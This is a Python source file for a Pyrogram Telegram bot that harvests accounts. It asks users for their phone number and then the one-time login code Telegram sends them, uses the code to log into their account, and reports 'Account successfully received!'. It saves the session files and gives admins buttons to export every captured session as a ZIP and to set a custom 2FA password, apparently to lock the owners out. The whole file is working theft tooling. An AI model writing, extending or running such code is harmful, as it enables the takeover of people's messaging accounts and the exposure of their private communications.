import asyncio
import nest_asyncio

try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

import os
import shutil
import zipfile
from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from config_engine import ConfigEngine
from telegram_engine import TelegramEngine

config = ConfigEngine()
tg_engine = TelegramEngine(config)

bot = Client(
    "bot_controller",
    api_id=config.api_id,
    api_hash=config.api_hash,
    bot_token=config.bot_token
)

# Temporary session data state
user_sessions = {}
admin_state = {}

def get_admin_keyboard():
    return ReplyKeyboardMarkup(
        [
            [KeyboardButton("📦 Export All Sessions"), KeyboardButton("🔑 Set 2FA Password")],
            [KeyboardButton("🌍 Allowed Countries"), KeyboardButton("➕ Add Country")]
        ],
        resize_keyboard=True
    )

@bot.on_message(filters.command("start") & filters.private)
async def start_handler(client, message: Message):
    user_id = message.from_user.id
    if user_id in config.admin_ids:
        await message.reply_text(
            "👑 **Welcome to Admin Control Panel**",
            reply_markup=get_admin_keyboard()
        )
    else:
        await message.reply_text("👋 **Welcome!**\nPlease send your phone number with country code.\nExample: `+8801700000000`")

# --- ADMIN PANEL ACTIONS ---

@bot.on_message(filters.private & filters.text)
async def handle_all_messages(client, message: Message):
    user_id = message.from_user.id
    text = message.text.strip()

    # Admin Control Flow
    if user_id in config.admin_ids:
        if text == "📦 Export All Sessions":
            await export_all_sessions(message)
            return
        elif text == "🔑 Set 2FA Password":
            admin_state[user_id] = "AWAITING_2FA"
            await message.reply_text(f"Current 2FA Password: `{config.custom_2fa_password}`\nSend new 2FA password:")
            return
        elif text == "🌍 Allowed Countries":
            await message.reply_text(f"Allowed Countries: `{', '.join(config.allowed_countries)}`")
            return
        elif text == "➕ Add Country":
            admin_state[user_id] = "AWAITING_COUNTRY"
            await message.reply_text("Send ISO Country Code (e.g., `CL`, `IN`, `US`, `BD`):")
            return

        # State check for Admin Inputs
        if admin_state.get(user_id) == "AWAITING_2FA":
            config.custom_2fa_password = text
            admin_state[user_id] = None
            await message.reply_text(f"✅ 2FA Password updated to: `{text}`", reply_markup=get_admin_keyboard())
            return
        elif admin_state.get(user_id) == "AWAITING_COUNTRY":
            c_code = text.upper()
            if c_code not in config.allowed_countries:
                config.allowed_countries.append(c_code)
            admin_state[user_id] = None
            await message.reply_text(f"✅ Country `{c_code}` added successfully!", reply_markup=get_admin_keyboard())
            return

    # User Phone & OTP Handling
    if text.startswith("+"):
        # Country Validation Check
        if not config.is_country_allowed(text):
            await message.reply_text("❌ এই কান্ট্রির নম্বর এই বটে গ্রহণযোগ্য নয়।")
            return

        await message.reply_text("🔄 Sending OTP...")
        try:
            res = await tg_engine.send_otp(text)
            user_sessions[user_id] = {
                "phone": text,
                "client": res["client"],
                "hash": res["phone_hash"]
            }
            await message.reply_text("📩 OTP Code has been sent! Please send the OTP here:")
        except Exception as e:
            await message.reply_text(f"❌ Error sending OTP: {e}")
            
    elif text.isdigit() and user_id in user_sessions:
        # OTP Processing
        sess = user_sessions[user_id]
        await message.reply_text("⚡ Verifying OTP and completing login...")
        
        res = await tg_engine.complete_login(
            client=sess["client"],
            phone_number=sess["phone"],
            phone_hash=sess["hash"],
            otp_code=text
        )
        
        if res["status"] == "success":
            await message.reply_text("✅ Account successfully received!")
        else:
            await message.reply_text(f"❌ Login Failed: {res.get('message', 'Unknown Error')}")
            
        del user_sessions[user_id]

async def export_all_sessions(message: Message):
    storage_dir = tg_engine.storage_dir
    files = os.listdir(storage_dir)
    
    if not files:
        await message.reply_text("📂 No sessions saved in the database yet.")
        return

    msg = await message.reply_text("📦 Archiving all sessions into a ZIP file...")
    zip_path = "all_sessions_export.zip"
    
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
        for root, _, filenames in os.walk(storage_dir):
            for filename in filenames:
                full_path = os.path.join(root, filename)
                zipf.write(full_path, filename)
                
    await message.reply_document(document=zip_path, caption=f"✅ Total exported files: {len(files)}")
    os.remove(zip_path)
    await msg.delete()

print("🤖 Upgraded Bot is starting...")
bot.run()
